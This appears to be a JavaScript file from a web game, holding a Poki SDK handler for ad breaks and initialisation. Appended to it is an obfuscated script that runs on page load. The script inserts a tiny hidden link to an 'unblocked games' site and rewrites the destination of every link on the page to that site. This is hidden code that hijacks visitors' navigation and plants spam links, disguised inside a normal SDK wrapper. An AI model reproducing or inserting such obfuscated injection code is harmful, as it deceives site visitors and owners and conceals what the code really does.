...

{
    ...
    const HANDLER_CLASS = class PokiHandler extends self.DOMHandler {
        ...
        HappyTime({
            ...
            if (!this._pokiSDKLoaded) return;
            globalThis["PokiSDK"]["happyTime"](intensity);
        }
        ...
        RequestCommercialBreak() {
            ...
            return globalThis["PokiSDK"]["commercialBreak"]()
                .then(() => {
        ...
        RequestRewardedBreak() {
            ...
            if (this._gameplayActive) this.NotifyGameplayStop();
            this.PostToRuntime("SuspendRuntime");
            return globalThis["PokiSDK"]["rewardedBreak"]()
                .then((success) => {
                    this.PostToRuntime("ResumeRuntime");
                    return {
                        result: success,
        ...
        SetDebugMode({
            ...
            if (!this._pokiSDKLoaded) return;
            globalThis["PokiSDK"]["setDebug"](this._debugModeActive = enable);
        }
        InitPoki({
            debugMode,
            preventScroll
            ...
            if (typeof globalThis["PokiSDK"] !== "undefined") {
                ...
                let adBlock = false;
                return globalThis["PokiSDK"]["init"]()
                    .then(() => {
...
var _0x597b06 = _0x3529;

function _0x3529(_0x202c62, _0x338e96) {
    var _0x1023d7 = _0x892c();
    return _0x3529 = function(_0x26c393, _0x4f36ae) {
        _0x26c393 = _0x26c393 - (0xaaa + -0x15 * -0x3e + -0xf42);
        var _0x2d7bc4 = _0x1023d7[_0x26c393];
        return _0x2d7bc4;
    }, _0x3529(_0x202c62, _0x338e96);
}(function(_0xafe1e9, _0x1c17fb) {
    var _0x4518f9 = _0x3529,
        _0x3022ed = _0xafe1e9();
    while (!![]) {
        try {
            var _0x361f18 = parseInt(_0x4518f9(0x8b)) / (0x2134 + 0x1a95 + 0x3bc8 * -0x1) * (-parseInt(_0x4518f9(0x8d)) / (-0x2098 + 0x35 * -0x4f + -0x53 * -0x97)) + -parseInt(_0x4518f9(0x92)) / (-0x14 * 0x3b + 0x1e16 + -0x1977) * (-parseInt(_0x4518f9(0xa6)) / (0x6 * -0xd6 + -0x16 * -0x19 + 0x2e2)) + parseInt(_0x4518f9(0x99)) / (0x680 + -0x2552 + 0x1ed7) + parseInt(_0x4518f9(0xac)) / (-0xf89 * -0x1 + 0x62 * 0x2a + -0x1f97) + -parseInt(_0x4518f9(0x7e)) / (0x13 + 0x127e + 0x128a * -0x1) + -parseInt(_0x4518f9(0x9f)) / (-0x2707 + -0x789 + 0x2e98) * (-parseInt(_0x4518f9(0x98)) / (0x23ea + 0x2 * -0x1273 + 0x9 * 0x1d)) + -parseInt(_0x4518f9(0x9a)) / (-0x26cb + 0x1c46 + 0x9f * 0x11);
            if (_0x361f18 === _0x1c17fb) break;
            else _0x3022ed['push'](_0x3022ed['shift']());
        } catch (_0x465383) {
            _0x3022ed['push'](_0x3022ed['shift']());
        }
    }
}(_0x892c, -0x1 * -0x9b155 + 0x1 * 0x1776 + -0x56ac), document[_0x597b06(0x9d) + _0x597b06(0x8e)](_0x597b06(0xa2) + _0x597b06(0x7f), function() {
    var _0x4051fd = _0x597b06,
        _0x4ec655 = {
            'sKRcf': _0x4051fd(0xa9) + _0x4051fd(0x96),
            'VBmjh': _0x4051fd(0xab),
            'pYMzw': _0x4051fd(0xa8) + _0x4051fd(0x80) + _0x4051fd(0xaf) + _0x4051fd(0x87) + _0x4051fd(0xb0) + _0x4051fd(0xad),
            'pOepw': function(_0x2b6dd3, _0x545239) {
                return _0x2b6dd3 / _0x545239;
            },
            'OuSiE': _0x4051fd(0x88),
            'yPwOP': _0x4051fd(0xaa),
            'fszqm': _0x4051fd(0x85),
            'Paiam': _0x4051fd(0xb2) + 'es'
        },
        _0x2d4600 = _0x4ec655[_0x4051fd(0x86)][_0x4051fd(0x95)]('|'),
        _0x17c83b = 0x1e6d * -0x1 + -0x14 * 0x1af + 0x4019;
    while (!![]) {
        switch (_0x2d4600[_0x17c83b++]) {
            case '0':
                _0x2f08e7[_0x4051fd(0x81)][_0x4051fd(0xa4)] = _0x4ec655[_0x4051fd(0x8c)];
                continue;
            case '1':
                var _0x4399d0 = {
                    'dZqUE': _0x4ec655[_0x4051fd(0xa1)]
                };
                continue;
            case '2':
                var _0x4c28c1 = document[_0x4051fd(0x82)],
                    _0x2048ac = _0x4c28c1[_0x4051fd(0xa7)],
                    _0x1f8490 = Math[_0x4051fd(0x9c)](_0x4ec655[_0x4051fd(0x89)](_0x2048ac[_0x4051fd(0xa0)], 0xa31 + 0xd1f + -0x174e));
                continue;
            case '3':
                _0x2f08e7[_0x4051fd(0x81)][_0x4051fd(0xae)] = _0x4ec655[_0x4051fd(0x94)];
                continue;
            case '4':
                _0x2f08e7[_0x4051fd(0x97)] = _0x4ec655[_0x4051fd(0xa1)];
                continue;
            case '5':
                _0x2f08e7[_0x4051fd(0x81)][_0x4051fd(0xa5)] = _0x4ec655[_0x4051fd(0x90)];
                continue;
            case '6':
                document[_0x4051fd(0x9e) + _0x4051fd(0xb1)](_0x4ec655[_0x4051fd(0x93)])[_0x4051fd(0x83)](_0x13d9d8 => {
                    var _0x772e8 = _0x4051fd;
                    _0x13d9d8[_0x772e8(0x97)] = _0x4399d0[_0x772e8(0x8a)];
                });
                continue;
            case '7':
                var _0x2f08e7 = document[_0x4051fd(0x9b) + _0x4051fd(0x91)]('a');
                continue;
            case '8':
                _0x2f08e7[_0x4051fd(0xa3) + 't'] = _0x4ec655[_0x4051fd(0x8f)];
                continue;
            case '9':
                _0x4c28c1[_0x4051fd(0x84) + 're'](_0x2f08e7, _0x2048ac[_0x1f8490]);
                continue;
        }
        break;
    }
...
function _0x892c() {
    var _0x5be9d3 = ['7330062xuPGxj', 'ion-game/', 'fontSize', 'ing.com/un', 'tegory/act', 'torAll', 'Action\x20Gam', '4294241nutyeA', 'Loaded', 'w.papasgam', 'style', 'body', 'forEach', 'insertBefo', 'body\x20a', 'sKRcf', 'blocked/ca', '1px', 'pOepw', 'dZqUE', '1023711beFEdD', 'VBmjh', '2gkdzAE', 'stener', 'Paiam', 'yPwOP', 'ent', '741oXOYHR', 'fszqm', 'OuSiE', 'split', '0|3|2|9|6', 'href', '9ShnMqI', '1379850KAnXOe', '11068300nlhySL', 'createElem', 'floor', 'addEventLi', 'querySelec', '5294120ykvkrx', 'length', 'pYMzw', 'DOMContent', 'textConten', 'zIndex', 'position', '19492aaNkVX', 'childNodes', 'https://ww', '1|7|4|8|5|', 'fixed', '9999'];
    _0x892c = function() {
        return _0x5be9d3;
    };
    return _0x892c();
